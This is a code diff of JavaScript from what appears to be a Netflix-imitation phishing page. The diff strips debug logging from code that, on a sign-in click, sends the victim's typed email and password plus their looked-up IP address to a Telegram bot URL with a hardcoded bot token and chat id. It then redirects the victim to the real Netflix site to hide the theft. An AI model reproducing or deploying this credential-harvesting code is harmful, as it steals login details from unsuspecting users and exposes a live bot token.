@@ -15,7 +15,6 @@ let ip ='Not Found'
 fetch('https://api.db-ip.com/v2/free/self')
     .then(result => result.json())
     .then((output) => {
-        console.log('Output: ', output);
         ip = output;
         
 }).catch(err => console.error(err));
@@ -23,14 +22,14 @@ fetch('https://api.db-ip.com/v2/free/self')
 
 signin.addEventListener("click", async (ev)=>{
             ev.preventDefault();
-            console.log("signing in...", ip.json());
+            console.log("signing in...");
                 const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`NETFLIX  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
     fetch(url, {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
         body: ''
     }).then(res => {
-        console.log("Request complete! response:", res);
+        console.log("Request complete!");
     });
             location.href = "https://www.netflix.com";
             return false;
